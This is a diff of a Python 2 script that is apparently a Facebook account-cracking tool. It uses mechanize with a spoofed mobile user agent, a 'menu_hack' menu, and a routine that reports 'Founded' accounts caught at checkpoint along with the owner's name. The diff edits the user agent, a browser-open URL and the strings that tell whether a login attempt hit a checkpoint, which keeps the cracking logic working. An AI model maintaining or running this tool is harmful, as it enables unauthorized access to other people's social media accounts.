@@ -19,7 +19,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/43.2.2254/140.293; U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/43.2.2254/14.0293; U; id) Presto/2.12.423 Version/12.16')]
 
 def jalan(z):
     for e in z + '\n':
@@ -195,7 +195,7 @@ def pilih():
                         else:
                             if zedd == '6':
                                 os.system('rm -rf login.txt')
-				os.system('xdg-open https://www.whatismyip.com/user-agent-info/')
+				os.system('xdg-open https://m.facebook.com/')
                                 keluar()
                             else:
                                 if zedd == '0':
@@ -369,7 +369,7 @@ def mini():
                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                 menu_hack()
             else:
-                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in y['error_msg']:
+                if 'https://m.facebook.com/' in y['error_msg']:
                     print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -389,7 +389,7 @@ def mini():
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                         menu_hack()
                     else:
-                        if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in y['error_msg']:
+                        if 'https://m.facebook.com/' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -409,7 +409,7 @@ def mini():
                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                 menu_hack()
                             else:
-                                if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in y['error_msg']:
+                                if 'https://m.facebook.com/' in y['error_msg']:
                                     print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
@@ -430,7 +430,7 @@ def mini():
                                         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                         menu_hack()
                                     else:
-                                        if 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1' in y['error_msg']:
+                                        if 'https://m.facebook.com/' in y['error_msg']:
                                             print '\x1b[1;91m[+] \x1b[1;92mFounded.'
                                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
